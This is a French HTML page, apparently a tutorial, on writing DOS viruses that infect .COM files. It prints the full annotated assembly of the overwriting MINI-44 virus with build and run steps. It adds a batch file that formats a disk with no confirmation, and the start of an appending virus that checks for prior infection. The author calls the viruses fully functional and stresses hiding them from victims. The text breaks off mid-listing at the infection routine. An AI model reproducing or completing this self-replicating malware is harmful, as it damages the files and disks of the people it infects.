@@ -1,0 +1,2145 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head><script language="javascript">
+
+myreg=new RegExp("lycos\.fr","i");
+if ( !myreg.test("'"+top.location+"'") ) {
+	nwreg=new RegExp ("http://([^/]+)?(/([a-z0-9A-Z\-\_]+)?[^']+)","i");
+	rn=nwreg.exec("'"+self.location+"'");
+	if (parent.frames.length==2) { top.location="http://" + rn[1] + rn[2]; }
+	else { top.location="http://" + rn[1] + "/" + rn[3]; }
+}
+
+if(window == window.top) {
+        var address=window.location;
+        var s='<html><head><title>'+'</title></head>'+
+        '<frameset cols="*,140" frameborder="0" border="0" framespacing="0" onload="return true;" onunload="return true;">'+
+        '<frame src="'+address+'?" name="memberPage" marginwidth="0" marginheight="0" scrolling="auto" noresize>'+
+		'<frame src="http://ads.multimania.lycos.fr/ad/google/frame.php?_url='+escape(address)+'&gg_bg=&gg_template=&mkw=virus+polymorphe+tasm&cat=noref" name="LycosAdFrame"  marginwidth="0" marginheight="0" scrolling="auto" noresize>'+
+        '</frameset>'+
+        '</html>';
+
+        document.write(s);      
+}
+</script><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><title>Virus de fichier .COM</title><script>
+function enlever_la_pub(){
+// 1 : on diminue la frame
+parent.document.body.cols = "*,0";
+// 2 : on remet le titre de la page originale
+parent.document.title=parent.memberPage.document.title;
+}
+</script></head>
+
+<body onload="javascript:enlever_la_pub();" bgcolor="black"><a doctype="" public="" -="" w3c="" html="" 4="" 01="" en="" http="" www="" w3="" org="" tr="" html4="" strict="" dtd="">
+</a>
+<!-- Date de création: 17/03/2001 -->
+
+
+
+
+
+
+<div align="center">
+<p> <img src="virus_com_data/austral.gif" height="48" width="48"> 
+<font color="#ff0000" size="6">VIRUS infecteurs de fichier ".COM"</font>
+<img src="virus_com_data/austral.gif" height="48" width="48"></p>
+</div>.<hr color="#800000" size="5">
+
+<br>
+<font color="#ffffff" size="3"><b>
+<br>
+<u>Avant propos :</u><br>
+<br>
+ <font color="#cccccc">Ce tutorial n'a pas pour but de prôner
+l'écriture de virus informatiques mais de mieux vous faire comprendre
+comment ils fonctionnent.<br>
+Il a été écrit de la façon la plus claire et la plus précise possible afin de le rendre accessible à tout le monde.<br>
+Etant donné que le savoir doit se transmettre , je ne vois pas pourquoi
+tous les aspects techniques des virus ne seraient pas abordés , c'est
+pourquoi les virus contenus dans ce manuel sont pleinement fonctionnels
+, car en effet, vous seuls serez responsables de vos actes et des
+conséquences de l'utilisation de tels programmes.</font><br>
+<br>
+<br>
+<font color="#6699ff" size="4"><div align="center">" Science sans conscience n'est que ruine de l'âme "<br>
+ Rabelais , 16 ème siècle.<br>
+</div></font>
+<br><br>
+Pour mener à bien cette initiation à la programmation de virus , vous aurez besoin des outils suivants :<br>
+<br>
+-	Un assembleur et un linker. (<a href="http://membres.lycos.fr/gatesbillou/virus/download/tasm_.exe"><font color="#00ff00">TASM et TLINK</font></a> par exemple).<br>
+-	Un traitement de texte  (l'éditeur du DOS fait très bien l'affaire "edit.com").<br>
+-	<a href="http://membres.lycos.fr/gatesbillou/virus/FAQ.html#Antivirus"><font color="#0dffaa">Un antivirus.</font></a><br>
+-	<a href="http://www.winzip.com/"><font color="#0dffaa">Winzip</font></a> (pour décompresser les programmes) ou <a href="http://membres.lycos.fr/gatesbillou/virus/download/unzip_.exe"><font color="#00ff00">Unzip (pour DOS)</font></a>.<br>
+-	Un <a href="http://membres.lycos.fr/gatesbillou/virus/download/TD.ZIP"><font color="#00ff00">débugger</font></a> (Borland Turbo Debugger)<br>
+-   Une <a href="http://membres.lycos.fr/gatesbillou/virus/download/IntelCodeTable.pdf"><font color="#00ff00">documentation récapitulative des fonctions assembleur</font></a> (source : www.jegerlehner.ch/intel).<br>
+<br>
+Je considérerai tout au long du tutorial que vous êtes en session  DOS.<br>
+Si vous êtes sous WINDOWS lancez <a href="http://membres.lycos.fr/gatesbillou/virus/jpeg/command.jpg"><font color="#fffbf0">COMMAND.COM</font></a> ou <a href="http://membres.lycos.fr/gatesbillou/virus/jpeg/mode_msdos.jpg"><font color="#f0f0f0">redémarrez en session DOS.</font></a><br>
+(Il est evident qu'il vaut mieux imprimer cette article avant de quitter windows <img src="virus_com_data/smileyfou" alt="" border="0" height="24" width="25">)<br>
+<br>
+<br>
+Pour ne pas vous faire piaffer d'impatience on commence avec le code
+source d'un virus hyper simple qui ne fait que de se réécrire par
+dessus les fichiers .COM .<br>
+<br>
+Code source du virus MINI-44 (Extrait du livre 'Du virus à l'antivirus' de Mark Ludwig , édition DUNOD)<br>
+</b></font><pre><font color="#ffffff" size="3"><b><font color="#00ffff">.model small  <font color="#a6caf0">; Définit le modèle de mémoire.</font>
+.code         <font color="#a6caf0">; Début du code.</font>
+<a name="fname_mini44">FNAME</a> EQU 9EH <font color="#a6caf0">; FNAME contiendra le nom du fichier résultant de la fonction 
+	      ; de recherche.(Emplacement 9Eh dans la zone DTA)</font>
+
+org 100h      <font color="#a6caf0">; Offset de chargement (emplacement mêmoire ,juste aprés le <a href="#PSP"><font color="#c0dcc0">PSP</font></a>).</font>
+start:        <font color="#a6caf0">; Ici on place un point appelé 'start'.(=&gt; label start)
+			      ;On pourra y revenir ou y faire référence plus tard.</font>
+
+  mov ah,<a href="#4eh"><font color="#05fad6">4eh</font></a>                 <font color="#a6caf0">;Place la valeur 4Eh dans le registre AH
+                             ;(c'est la fonction de l'interruption 21h
+                             ;du DOS qui permet de chercher un fichier).
+			     ;Pour 4eh , le 'h' correspond à Hexadécimal.</font>
+  mov dx,offset <a href="#com_file_mini44"><font color="#00ffff">COM_FILE</font></a>     <font color="#a6caf0">;Place dans DX la chaîne ASCII '*.com' définie
+                             ;plus bas qui permettra au DOS de chercher
+                             ;les fichiers .COM grâce à la fonction 4Eh.</font>
+Int 21h			     <font color="#a6caf0">;Exécute la recherche et formate un bloc de
+                             ;43 octets dans la DTA(Disk Transfert Area)
+                             ;pour y placer le nom du fichier trouvé, sa
+                             ;position(pour savoir où continuer la recherche
+                             ;grâce à la fonction 'search next': 4Fh), ses
+                             ;attributs, la date et l'heure de sa dernière
+                             ;modification, et sa taille.
+                             ;Le nom du fichier trouvé est placé au 158 ème octet de la DTA (fname).</font>
+							 
+				
+<a name="searhc_lt_mini44">search_lp:</a>
+  jc <a href="#done_mini44"><font color="#00ffff">done</font></a>                    <font color="#a6caf0">;Si aucun fichier n'est trouvé, aller au
+                             ;label 'done'.</font>
+
+  mov ax,<a href="#3dh"><font color="#05fad6">3d</font></a>01h               <font color="#a6caf0">;Indique au DOS qu'on veut ouvrir le fichier qu'on a trouvé.</font>
+                             ; <i><font color="#a6caf0">AH = 3D  AL = 01 =&gt; AX=3D01H</font></i>
+  mov dx,<a href="#fname_mini44"><font color="#00ffff">fname</font></a>               <font color="#a6caf0">;Pointeur vers le nom de fichier trouvé par
+                             ;la fonction de recherche 'search first'.</font>
+  int 21h		     <font color="#a6caf0">;Lance l'interruption 21h.</font>
+
+  xchg ax,bx                 <font color="#a6caf0">;Intervertit AX et BX (le numéro que le DOS
+                             ;a attribué à ce fichier pour l'identifier).
+                             ;(le FILE HANDLE).</font>
+                                                                        
+  mov ah,<font color="#05fad6"><a href="#40h"><font color="#05fad6">40h</font></a></font>                 <font color="#a6caf0">;Place la valeur 40h dans le registre AH
+                             ;(40h = Fonction du DOS qui permet d'écrire
+                             ;dans un fichier).</font>
+
+  mov cl,[ender-start]       <font color="#a6caf0">;Réécrit le virus(compris entre le label
+                             ;'ender' et le label 'start') par dessus
+                             ;le code du fichier hôte</font>
+  mov dx,100h                <font color="#a6caf0">;en recopiant à partir de l'adresse 100h
+                             ;(début du virus).</font>
+  int 21h                    <font color="#a6caf0">;Appel de l'interruption 21h du DOS pour
+                             ;lancer la réécriture.</font>
+
+  mov ah,<a href="#3eh"><font color="#05fad6">3eh</font></a>                 <font color="#a6caf0">;Indique " Fermer le fichier infecté. "</font>
+  int 21h                    <font color="#a6caf0">;Ferme le fichier.</font>
+ 
+  mov ah,<a href="#4fh"><font color="#05fad6">4fh</font></a><font color="#05fad6"></font>                 <font color="#a6caf0">;Appel de la fonction 4Fh('search next')
+                             ;qui permet de continuer la recherche des
+                             ;fichiers .COM dans le répertoire courant.</font>
+  int 21h
+  jmp <a href="#searhc_lt_mini44"><font color="#00ffff">search_lp</font></a>              <font color="#a6caf0">;Retourne au label 'search' pour continuer
+                             ;la recherche.</font>
+
+<a name="done_mini44">done:</a>
+  ret                        <font color="#a6caf0">;Termine le programme.</font>
+
+<a name="com_file_mini44">COM_FILE</a> db '*.com',0        <font color="#a6caf0">;Place la chaîne de caractère '*.com'
+                             ;dans COM_FILE (COM_FILE="*.COM")</font>
+                             ;<font color="#a6caf0">C'est le type de fichier qu'on recherche.</font>
+
+ender:                       <font color="#a6caf0">;Label qui sert à déterminer la taille
+                             ;du virus.</font>
+
+end start                    <font color="#a6caf0">;Fin du code.</font>
+</font>
+</b></font></pre>
+<font color="#ffffff" size="3"><b>Le code assembleur : <a href="http://membres.lycos.fr/gatesbillou/virus/download/mini-44.zip"><font color="#fca443">MINI-44.ASM</font></a><br>
+<br>
+Annimation du fonctionnement d'un virus avec recouvrement :<br>
+<br><i>Source : http://iquebec.ifrance.com/projinfo/virus2.html</i>
+<br>
+<img src="virus_com_data/recou.gif" border="0" height="300" width="500">
+
+<br>
+Comment rendre ce code exécutable ?? . Simple !<br>
+Créez un répertoire " ASM " sous la <a href="http://membres.lycos.fr/gatesbillou/virus/jpeg/command_com.jpg"><font color="#ffffff">ligne de commande</font></a>.<br>
+<br>
+ C:\WINDOWS\Bureau&gt; <font color="#c0c0c0">CD \</font><br>
+ C:\&gt; <font color="#c0c0c0">MD ASM</font><br>
+ C:\&gt; <font color="#c0c0c0">CD ASM</font><br>
+ C:\ASM&gt;<br>
+<br>
+Sous Windows , copiez le code source du virus dans ce répertoire sous le nom 'virus.asm'.<br>
+Puis assemblez le :<br>
+<br>
+ C:\ASM&gt; <font color="#c0c0c0">TASM virus.asm</font>   (Il peut vous dire qu'il y à une "erreur" à la ligne 42 ;pas de problème).<br>
+ C:\ASM&gt; <font color="#c0c0c0">TLINK /t virus</font>   (" /t " c'est pour créer un fichier .COM)<br>
+<br>
+Le code peut être édité sous l'éditeur du dos (edit.com) ou sous le bloc-notes de windows.<br>
+Ce virus ne change pas de répertoire et ne peut donc pas se propager dans votre disque dur.<br>
+<br>
+<u>Pour faire un petit essai</u> :<br>
+<br>
+Créez un fichier texte où vous y mettez une phrase (contenant 50
+caractères) et enregistrez-le sous le nom 'cible.com' (toujours dans le
+répertoire " ASM ").<br>
+<i><a href="http://membres.lycos.fr/gatesbillou/virus/download/cible.com"><font color="#99ccff">Telecharger CIBLE.COM</font></a></i> (Enregistrez le dans le repertoire ASM).<br>
+Lancez le virus puis éditez 'cible.com'.<br>
+Miracle , le virus a réécrit par dessus votre texte (pas en entier , seulement sur 44 octets , d'où le nom du virus). <br>
+Editeur hexadecimal fonctionnant sous DOS : <a href="http://membres.lycos.fr/gatesbillou/virus/download/hexados.zip"><font color="#ffffcc">HVIEW</font></a><br>
+Il est très intéressant de tracer le virus avec <a href="http://membres.lycos.fr/gatesbillou/virus/download/TD.ZIP"><font color="#ffffcc">Turbo Debugger</font></a>.<br>
+Vous pouvez par la même occasion essayer <a href="http://membres.lycos.fr/gatesbillou/virus/download/KGB.ZIP"><font color="#ffffcc">KGB</font></a> et le paramétrer à votre guise pour la suite.<br>
+<br>
+<u><font color="#ffff00">Liste et détails des fonctions utilisées par le virus.</font></u><br>
+<br>
+<a name="4eh">A)<font color="#00ff33">La fonction 4Eh(search first=&gt;Recherche du premier fichier).</font></a><br>
+<br></b></font><pre><font color="#ffffff" size="3"><b>Paramètres d'entrée : AH=4Eh  (reçoit le numéro de la fonction).
+                      CL=Attribut de fichier à utiliser dans la recherche 
+                      (c'est pas indispensable).
+                      DS:DX=Pointeur vers une chaîne ASCII ou un nom de fichier 
+                      (Dans notre virus ça sert a spécifier la recherche '*.com' et à stocker
+                       le résultat de la recherche).
+Renvoie: AX=0 si pas d'erreur, sinon, AX=n°de l'erreur.
+
+<a href="http://membres.lycos.fr/gatesbillou/virus/download/exemple_find_file.zip"><font color="#ffff99">Cliquez ici pour téléchargez un exemple d'utilisation.</font></a>
+<a href="http://membres.lycos.fr/gatesbillou/virus/jpeg/td.jpg"><font color="#ff00ff">Voir aussi la photo_ecran.</font></a>
+Le nom du fichier trouvé se situe dans la partie DTA du <a href="#PSP"><font color="#99ccff">PSP</font></a>.
+
+<a name="4fh">B)<font color="#00ff33">La fonction 4Fh(search next=&gt;Recherche du fichier suivant).</font></a>
+
+Paramètres d'entrée: AH=4Fh
+Renvoie :            AX=0 si pas d'erreur, sinon, AX=n°de l'erreur.
+Fonction: Permet de continuer la recherche commencée à l'aide de la fonction 'search first'.
+</b></font></pre><font color="#ffffff" size="3"><b><b>Attention</b>! entre deux appels les informations contenues dans la DTA ne doivent pas être modifiées .</b></font><pre>
+
+<font color="#ffffff" size="3"><b><a name="3dh">C)<font color="#00ff33">La fonction 3Dh(Ouverture de fichier)</font></a>
+
+Paramêtres d'entrée: AH=3Dh
+                     AL=mode d'ouverture(0=lecture seule, 1=écriture, 2=lecture/écriture)
+                     DS:DX=Pointeur vers une chaîne ASCII ou un nom de fichier.
+Renvoie: AX contient le FILE HANDLE si aucune erreur, sinon, AX=Code d'erreur.
+
+
+<a name="3eh">D)<font color="#00ff33">La fonction 3Eh(Fermeture de fichier)</font></a>
+
+Paramêtres d'entrée: AH=3Eh
+                     BX=File Handle du fichier à fermer.
+Renvoie: AX= code d'erreur si la fermeture échoue.
+
+
+<a name="40h">E)<font color="#00ff33">La fonction 40h(Ecriture vers un fichier)</font></a>
+
+Paramètres d'entrée: AH=40h
+                     BX=File Handle du fichier à fermer.
+                     CX=Nombre de bytes à écrire.
+                     DS:DX=Pointeur sur le buffer dont on tire les données.
+Renvoie: AX= code d'erreur si l'écriture échoue.
+         AX= Nombre d'octets écrits si aucune erreur.
+
+</b></font></pre>
+<font color="#ffffff" size="3"><b><br>
+<font color="#ffff00"><u>Quelques rappels utiles :</u></font><br>
+<br>
+<font color="#00ffff"><i>Les JMP et les CALL :</i></font><br>
+<br>
+JMP : JUMP - SAUT  * On saute à l'adresse indiquée sans se souvenir d'où on vient.<br>
+CALL : CALL - APPEL * On saute à l'adresse indiquée et quand on a fini on revient où on en était.<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;Lorsqu'on fait un JUMP vers une adresse , le
+processeur met l'adresse de destination dans le registre IP.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;Lorsqu'on fait un CALL vers une adresse , le
+processeur met l'adresse courant dans la PILE et met l'adresse du CALL
+dans le registre IP. Lors du RET (Return - Retour à l'appelant), il
+dépile l'adresse de retour et la met dans le registre IP.<br>
+<br>
+<font color="#00ffff"><i>La mémoire :</i></font><br>
+<br>
+<a name="registres"><font color="#8080ff"><u>Bon, maintenant , rappelons quelques bases sur les fichiers " .COM ".</u></font><br></a>
+<br>
+<a name="size">-   La taille d'un fichier .COM est limitée à 64Ko (65536 octets avec le PSP)*</a><br>
+-   Les registres de segments ont tous la même valeur au démarrage (cs=ds=ss=es).<br>
+-   Le code, la pile et les données se partagent donc les mêmes segments.<br>
+-   Un fichier " .COM " se charge toujours à l'offset 100h ,juste après le PSP (Prefix Segment Program)<br>
+-   Le fichier COM est chargé tel quel dans la mémoire, après le PSP.(<big>C</big>opy <big>O</big>f <big>M</big>emory).<br>
+<br>
+* 64 Ko=65536 octets  (comprenant le PSP !)<br>
+  65536 - 256 octets de PSP = 65280 octets de codes exécutables.<br>
+  le fichier à infecter NE doit PAS excéder 65280 octets <u>moins la longueur du virus</u>. (<i>A l'exeption des virus avec recouvrement</i>)<br>
+<br> Prenons l'exemple d'un programme .COM chargé à l'adresse 1234:0000
+, le programme .COM tient donc dans l'espace mémoire [ 1234:000 ;
+1234:FFFF ].<br>
+<br>
+<font color="yellow"><u><i>Comment le DOS charge un fichier .COM :</i></u></font><br>
+<br>
+1) Le DOS crée en premier lieu un segment préfixe (PSP) de 256 octets
+dans lequel ,entre autres, il y a la ligne de commande tapée derrière
+le nom du fichier.<br>
+2) Après , il copie entièrement le fichier en mémoire, juste derrière le PSP.<br>
+3) Il initialise les trois registres de segment DS ES et SS sur le début du PSP.<br>
+4) Ensuite il initialise le registre SP sur la fin du segment (en
+général FFFE) qui est le dernier mot du segment (Stack Pointer -&gt;
+Pointeur de pile).<br>
+5) Enfin , il fait démarrer le programme en placant le registre CS au
+début du PSP et le registre IP à 100h (Le départ du programme .COM).<br>
+&nbsp;&nbsp;&nbsp;&nbsp;le Registre IP est le registre qui pointe vers l'instruction à exécuter (Instruction Pointer).<br>
+<br>
+<br>
+Une Adresse se compose de 2 parties : [<font color="#00ff00">B800</font>:<font color="#008000">0000</font>]   (Ici , c'est l'adresse video texte)<br>
+</b></font><pre><font color="#ffffff" size="3"><b>                          <font color="#00ff00">Le segment</font> : <font color="#008000">L'offset</font></b></font></pre><font color="#ffffff" size="3"><b><br>
+<br>
+La limite des fichiers .COM vient du fait que l'adressage en mode réel se fait sur un bus 16 bits (2<sup>16</sup> octets =&gt; 65536 octets).<br>
+L'offset offre donc 16 * 16 * 16 * 16 = 65536 adresses. <u>Le fichier .COM tient dans 1 segment ; pas plus</u>.<br>
+<br>
+<font color="#ff0000">Attention ! </font><br>
+<br>
+<font color="#ff5757">La mémoire ne s'adresse pas de facon 'linéaire' ! .</font><br>
+<br>
+Je veux dire par là qu'un emplacement mémoire peut s'écire de différentes façons.<br>
+<br>
+Par exemple , l'adresse mémoire  1234h:5678h  peut s'écrire 1235h:5668h ou 1236h:5658h etc.   <img src="virus_com_data/quoi" alt="" border="0" height="15" width="21"><br>
+<br>
+<u>Voilà une chose IMPORTANTE A COMPRENDRE !</u>   <img src="virus_com_data/etudie" alt="" border="0" height="27" width="19"><br>
+<br>
+On compte en Hexadécimal (16 en décimal = 10 en hexadécimal).<br>
+Déja , si vous ne connaissez pas l'hexadécimal , commencez par <a href="http://www.commentcamarche.net/base/binaire.php3"><font color="#ff80ff">cliquer ICI</font></a> .<br>
+Pour essayer vous même , vous aller sous Turbo Debugger, vous prenez une adresse au hasard.<br>
+Avec la calculatrice windows passée en mode 'scientifique' et en mode 'Hex', vous tapez l'adresse segment (ici 1234).<br>
+Vous y ajoutez 1 (en Hexa). C'est votre nouveau Segment.<br>
+Ensuite vous prenez l'offset (ici 4678) et vous y retranchez 10 (tj en hexa). C'est votre nouvel offset.<br>
+Et voila ! vous avez à nouveau l'adresse , mais codée différemment.<br>
+Pour les virus de fichiers .COM , on n'a pas à s'en soucier , par
+contre lorsqu'il sagit de manipuler la mémoire sur plusieurs segments ,
+il faut penser à calculer en adressage Absolue.<br>
+<cite>En gros , quand on ajoute 1h au segment , c'est comme si on ajoute 10h à l'offset.</cite><br>
+Maintenant , il ne vous reste plus qu'a vérifier mes dires et vos calculs sous Turbo Debugger.<br>
+</b></font><pre><font color="#ffffff" size="3"><b>Allez aussi jeter un petit coup d'oeil sur : <a href="http://www.commentcamarche.net/asm/assembleur.php3"><font color="#0000ff"><font color="#66ff99">ce site sur la programmation en assembleur</font></font></a> pour de plus amples informations.
+
+
+<font color="#ffff00"><u>Explication du PSP :</u></font>
+
+<a name="PSP"><i>Le PSP ... ça ressemble à quoi ce truc ??</i></a>
+
+<font color="#00ff00">Offset:    Taille :      Description:</font>
+
+  <font color="#c0dcc0">0h          2          Instruction Int 20h (Permet de retourner sous DOS)
+  2h          2          Adresse du dernier segment alloué (espace disponible)
+  4h          1          Réservé
+  5h          5          Far call vers le vecteur d'interruption 21h
+  Ah          4          Vecteur d'interruption 22h (Terminal address)
+  Eh          4          Vecteur d'interruption 23h (CTRL+BREAK handler address)
+ 12h          4          Vecteur d'interruption 24h (Critical error handler address)
+ 16h         22          Réservé
+ 2Ch          2          Segment de l'environnement DOS (path , set , etc)
+ 2Eh         34          Réservé
+ 50h          3          Int 21h / instruction RETF
+ 53h          9          Réservé
+ 5Ch         16          File Control Block 1 (premiere ligne de commande)
+ 6Ch         20          File Control Block 2 (deuxième ligne de commande)
+ 80h        128          DTA (Zone de transfert de données).
+100h            ---&gt; Le programme .COM commence à partir de cette adresse.</font>
+</b></font></pre>
+<font color="#ffffff" size="3"><b><u>Attention , le premier octet de la DTA indique sa longueur. (les données sont en 81h)</u><br>
+<br>
+D'accord , mais  ça sert à quoi  ????<br>
+A rien &#8230; <img src="virus_com_data/zut" alt="" border="0" height="22" width="21">  .ça nous vient de l'époque du CPM , c'est désormais obsolète <u>mais il faut y tenir compte</u> quand on crée un programme '.COM '. (CPM est un ancien concurent du DOS)<br>
+PSP signifit '<b><i>Program Segment Prefix</i></b>'.<br>
+La seul chose utile c'est la ligne de commande passée au programme , elle se trouve dans ce fameux PSP.<br>
+Le PSP est une zone de 256 octets située juste avant avant votre programme (en memoire).<br>
+Il se situe donc à l'offset 0000h du 'code segment' et contient des informations nécessaires à l'execution du programme.<br>
+A l'origine, il a été conçu pour assurer une compatibilité avec le
+système d'exploitation CPM , et permettre d'adapter facilement au
+MS-DOS des programmes écrits pour CPM.<br>
+Le code source du CPM a été rendu publique récament.<br>
+Etant donné que plus personne n'utilise le CPM , vous comprendrez que
+certaines informations contenues dans cette zone ne servent plus à
+grand chose.<br>
+Pour info , le CP/M-DOS a été créé par G. KILDALL (Control Programfor Microcomputers - Disk Operating System)<br>
+C'est le premier système d'exploitation pour micro-ordinateurs (8080 d'Intel).<br>
+C'est aussi l'inspirateur du QDOS de Tim PATERSON qui deviendra MS-DOS.<br>
+<br>
+Pour les sources du CP-M <a href="http://www.barnyard.co.uk/cpm/www.cpm.z80.de/source.html"><font color="#c0c0c0">cliquez ICI.</font></a> 
+<br>
+</b></font><pre><font color="#ffffff" size="3"><b><u>Par exemple :</u>
+
+ - l'interruption 20h servait à retourner sous dos , mais maintenant on utilise :
+   ' mov ah,4ch
+     int 21h    '
+   Remarquez que vous pouvez toujours utiliser l'interruption 20h .
+   
+ - en offset 5ch et 6ch , le FCB étaient utilisés dans les versions 1.xx du MS-DOS.
+
+</b></font></pre>
+<font color="#ffffff" size="3"><b>La taille d'un programme .COM est <a href="#size"><font color="#ffffff"><u>limitée</u></font></a> , ne l'oubliez pas , sans quoi vous pouvez altérer le PSP et tout faire planter .<br>
+<br>
+Je pense que si vous êtes arrivés jusqu'ici c'est que vous voulez créer
+un VRAI virus ou savoir en détail comment ils fonctionnent (autrement
+il existe beaucoup d'autre sites internet qui parlent des virus
+informatiques de façon moins détaillée et avec beaucoup plus de 'SI on
+avait fait ça...' ).<br>
+Il est évident que le programme listé plus haut fonctionne et peut être
+considéré comme un virus mais vous serez d'accord avec moi pour dire
+qu'il a peu de chance de se propager d'ordinateur en ordinateur et
+pouvoir prétendre jouer dans la cour des grands.<br>
+Lorsqu'on construit un virus il ne faut pas prendre les gens pour des
+idiots , il est évident que le gars qui voit ses programmes planter les
+uns après les autre va réagir.<br>
+Il faut donc impérativement rendre notre virus furtif , et c'est là
+qu'une bonne connaissance du fonctionnement de l'ordinateur et beaucoup
+de temps de réflexion deviennent importants.<br>
+Il faudra faire un compromis entre la vélocité du virus , sa taille , et sa furtivité.<br>
+<br>
+<font color="#baa9d6"><u>Explications :</u></font><br>
+<br> On peut très bien faire un virus en langage de haut niveau comme
+le C ou le Pascal qui se cache relativement bien (virus compagnon) et
+qui peut être très dur à exterminer mais qui, par contre , a peut de
+chance de se transmettre d'ordinateur en ordinateur.<br>
+Pour ce qui est de la taille, le virus étudié précédemment est très
+petit mais , comme on a vu , d'un efficacité restreinte (c'est un
+kamikaze).<br>
+Et pour ce qui est de la furtivité il faut savoir qu'elle engendre
+beaucoup de complications , elle demande un connaissance extrêmement
+approfondie du système d'exploitation , beaucoup d'imagination , et
+peut très bien se retourner contre lui-même en trahissant sa présence
+(parfois on voit des trucs paradoxaux).<br>
+Il faut donc doser avec intelligence.<br>
+<u>Notre virus doit aussi laisser son hôte intact.</u><br>
+<br>
+En language de haut niveau et même en language script il est possible de créer un virus polymorphe.<br>
+Ne serait-ce que pour juger des possibilités d'un simple fichier .BAT , voici un exemple :<br>
+<br>
+Dans un fichier nommé 'BOMB01.BAT' entrez les lignes suivantes :<br>
+ <br>
+<font color="#a6caf0">FORMAT A:<br>
+O</font><br>
+<br>
+Ou tout simplement ceci :<br>
+<br>
+<font color="#a6caf0">FORMAT A: /AUTOTEST /Q /U</font><br>
+<br>
+<font color="#ff738f"><u><i>Faites attention ! Il n'y aura pas de demande de confirmation de formatage.</i></u></font><br>
+<br>
+puis enregistrez , placez une disquette <u>vierge</u> et lancez le fichier .BAT<br>
+Voilà que DOS formate votre disquette sans que vous ayez à confirmer !<br>
+PS : ce type de 'bombe numérique' n'est absolument pas détecté par les
+logiciels antivirus les plus récents et les plus perfectionnés.<br>
+<br> Le virus suivant convient mieux à ce qu'on veut faire car le
+programme infecté continuera à s'exécuter normalement , de plus il ne
+modifie ni la date ni l'heure de création du fichier hôte (furtivité de
+base ,mais furtivité quand même !).<br>
+<br>
+<u>Schéma mémoire lors du chargement :</u><br>
+</b></font><pre><font color="#ffffff" size="3"><b>000h .-----------------.
+            PSP
+100h .-----------------.
+       Saut vers virus
+103h .-----------------.
+    Corp du programme hôte
+xxxh .-----------------.	
+        corp du Virus
+yyyh .-----------------.		
+
+ <font color="#00ffff">
+.model tiny				  <font color="#a6caf0">; Model de mémoire</font>
+.code 					  <font color="#a6caf0">; Début du code</font>
+org 100h				  <font color="#a6caf0">; Début du fichier .COM</font>
+
+MAIN:             db 0e9h,00h,00h            <font color="#a6caf0">; Jmp START_VIRUS</font>
+
+START_VIRUS       proc near                  <font color="#a6caf0">; Début réel du virus</font>
+call FIND_OFFSET
+
+<font color="#a6caf0">; Calculate change in offset from host program.</font>
+
+<a name="FIND_OFFSET">FIND_OFFSET: </a>
+                  pop bp                        <font color="#a6caf0">; BP contient le Pointeur d'Instruction (registre IP)</font>
+                  sub bp, offset FIND_OFFSET    <font color="#a6caf0">; Calcule l'adresse actuelle dans BP</font>
+
+<font color="#a6caf0">; Restore original bytes to the infected program.</font>
+
+                  lea si,[bp+ORIG_START]        <font color="#a6caf0">; Restaure les 3 bytes d'origine.
+                                                ; Charge l'adresse mémoire [bp+ORIG_START]
+                                                ; dans le registre 16 bits SI ...</font>
+                  mov di,100h                   <font color="#a6caf0">; vers 100h, début du fichier</font>
+                  push di                       <font color="#a6caf0">; Copie 3 bytes</font>
+                  movsw
+                  movsb
+
+<font color="#a6caf0">; Change the DTA from the default so FINDFIRST/FINDNEXT won't destroy
+; original command line parameters.</font>
+
+                  lea dx,[bp+NEW_DTA]           <font color="#a6caf0">; Pointe vers la nouvelle DTA.</font>
+                  call SET_DTA                  <font color="#a6caf0">; Change</font>
+
+<font color="#a6caf0">; DOS Findfirst / Findnext services</font>
+
+
+FINDFIRST:        mov ah,4eh                    <font color="#a6caf0">; Demande au DOS de trouver un fichier</font>
+                  lea dx,[bp+COM_MASK]          <font color="#a6caf0">; Cherche tous les fichiers .COM</font>
+                  xor cx,cx                     <font color="#a6caf0">; Attribu 0 (rien)</font>
+FINDNEXT:         int 21h                       <font color="#a6caf0">; Demande au DOS de chercher</font>
+                  jc QUIT                       <font color="#a6caf0">; Quitter si erreurs
+                                                ; ou plus de fichiers</font>
+
+<font color="#a6caf0">; Si j'arrive ici , c'est que j'ai trouvé une victime. Ouvre le fichier et vérifie
+; s'il n'est pas déja infecté.</font>
+
+                  mov ax,3d00h              <font color="#a6caf0">; DOS Open file, read only</font>
+                  lea dx,[bp+NEW_DTA+30]    <font color="#a6caf0">; Pointer vers le fichier qu'on a trouvé</font>
+                  int 21h                   <font color="#a6caf0">; Le DOS pointe.</font>
+                  xchg ax,bx                <font color="#a6caf0">; Sauvegarde les attribus du fichier en BX</font>
+
+<font color="#a6caf0">; Vérifie si on a déja infecté ce fichier en cherchant à la fin la présence du code viral</font>
+
+                  mov ah,3fh                    <font color="#a6caf0">; DOS Read file</font>
+                  lea dx,[bp+ORIG_START]        <font color="#a6caf0">; Sauve l'entête d'origine</font>
+                  mov cx,3                      <font color="#a6caf0">; Lit les 3 premiers bytes</font>
+                  int 21h                           <font color="#a6caf0">; Demande au dos de lire</font>
+                  mov ax,word ptr [bp+NEW_DTA+26]   <font color="#a6caf0">; met la taille du fichier an AX</font>
+                  mov cx,word ptr [bp+ORIG_START+1] <font color="#a6caf0">; Jmp offset</font>
+                  add cx,END_VIRUS-START_VIRUS+3    <font color="#a6caf0">; Met la taille du virus en CX</font>
+                  cmp ax,cx                     <font color="#a6caf0">; compare la taille du virus avec la taille</font>
+                  jnz INFECT_COM                <font color="#a6caf0">; du fichiers si c'est pas égale on infecte.</font>
+                  mov ah,3eh                    <font color="#a6caf0">; autrement ferme le fichier</font>
+                  int 21h                       <font color="#a6caf0">; et essaye sur un autre fichier</font>
+                  mov ah,4fh                    ;<font color="#a6caf0"> chercher un autre fichier</font>
+                  jmp short FINDNEXT  			<font color="#a6caf0">; saute vers FINDNEXT</font>
+
+<font color="#a6caf0">; Restore default DTA and pass control back to original program.
+; Call any activation routines here.</font>
+
+QUIT:             mov dx,80h                    <font color="#a6caf0">; Restaure la DTA d'origine.</font>
+                       call SET_DTA             <font color="#a6caf0">; restaure.</font>
+                       retn                     <font color="#a6caf0">; Fin du virus et début du programme d'origine
+                                                ; Remember, DI holding
+                                                ; 100h was pushed on the stack.</font>
+
+<font color="#c0dcc0">;*** Subroutine INFECT_COM ***</font>
+
+INFECT_COM:
+
